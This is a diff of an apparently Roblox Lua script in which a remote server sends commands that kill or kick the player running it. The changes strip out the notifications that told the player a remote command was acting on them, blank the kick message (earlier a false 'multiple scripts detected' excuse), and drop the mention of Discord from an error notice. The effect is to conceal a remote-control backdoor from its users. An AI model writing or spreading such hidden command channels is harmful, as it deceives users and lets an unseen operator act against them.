@@ -104,11 +104,6 @@ local function checkDiscordCommands()
                     pcall(function()
                         if targetPlayer == LocalPlayer then
                             LocalPlayer.Character.Humanoid.Health = 0
-                            Window:Notify({
-                                Text = "💀 You were killed by Discord command!",
-                                Duration = 3,
-                                Type = "Error"
-                            })
                         end
                     end)
                 end
@@ -124,13 +119,8 @@ local function checkDiscordCommands()
             elseif cmd.type == "kick" then
                 -- Kick command
                 if cmd.target == LocalPlayer.Name then
-                    Window:Notify({
-                        Text = "👢 You are being kicked...",
-                        Duration = 2,
-                        Type = "Error"
-                    })
                     task.wait(1)
-                    LocalPlayer:Kick("Kicked: multiple scripts detected only use one script for everything to not bug")
+                    LocalPlayer:Kick("")
                 end
             end
         end
@@ -167,7 +157,7 @@ local function registerWithDiscord()
     if not success1 then
         warn("❌ Can't reach server:", tostring(response1))
         Window:Notify({
-            Text = "❌ Failed to connect to Discord server",
+            Text = "❌ Failed to connect to Server",
             Duration = 3,
             Type = "Error"
         })
